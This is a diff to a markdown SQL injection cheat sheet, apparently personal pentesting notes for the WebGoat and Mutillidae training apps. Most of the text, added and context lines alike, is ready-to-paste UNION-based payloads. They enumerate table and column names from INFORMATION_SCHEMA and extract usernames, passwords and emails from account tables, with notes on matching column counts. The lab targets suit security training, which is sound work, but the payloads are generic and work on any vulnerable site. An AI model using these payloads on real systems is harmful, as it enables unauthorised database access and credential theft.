@@ -96,6 +96,8 @@ Get Tables in Database
 ```sql
 -- Table has 3 columns as identified above for this reason there are two "NULL" required. 
 '+UNION+ALL+SELECT+NULL,NULL,concat(TABLE_NAME)+FROM+information_schema.TABLES+WHERE+table_schema='webgoat_coins'#
+'UNION+ALL+SELECT+NULL,NULL,CONCAT('~',table_name,'~'),NULL,NULL,NULL,NULL+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema+IN+('mutillidae')--+
+'UNION+ALL+SELECT+NULL,NULL,CONCAT(table_name),NULL,NULL,NULL,NULL+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema+IN+('mutillidae')--+
 ```
 
 
@@ -104,6 +106,10 @@ Get Columns When Table Name is Known
 ```sql
 # Table has 3 columns as identified above for this reason there are two "NULL" required. 
 '+UNION+ALL+SELECT+NULL,NULL,CONCAT(column_name,'+',column_type)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='products'+AND+table_schema='webgoat_coins'#
+
+# Table has 7 columns
+'UNION+ALL+SELECT+NULL,NULL,CONCAT('qpjpq',column_name,'ubndwt',column_type,'qvpkq'),NULL,NULL,NULL,NULL+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='accounts'+AND+table_schema='mutillidae'--+
+'UNION+ALL+SELECT+NULL,NULL,CONCAT(column_name,'~',column_type),NULL,NULL,NULL,NULL+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name='accounts'+AND+table_schema='mutillidae'--+
 ```
 
 
@@ -114,6 +120,8 @@ Get Data from Columns MORE NOTES NEEDED
 INJECTION MUST RESPECT THE NUMBER OF COLUMNS. USE NULL IF REQUIRED.
 '+UNION+SELECT+<columnname>,<columnname>+FROM+<tablename>--%20
 '+UNION+SELECT+user,password+FROM+users--%20
+# 7 columns
+'+UNION+ALL+SELECT+NULL,NULL,CONCAT(username,'+',password),NULL,NULL,NULL,NULL+FROM+mutillidae.accounts--+
 
 '+UNION+SELECT+NULL,email,+password+FROM+customerlogin#
 '+UNION+SELECT+answer,email,+password+FROM+customerlogin#
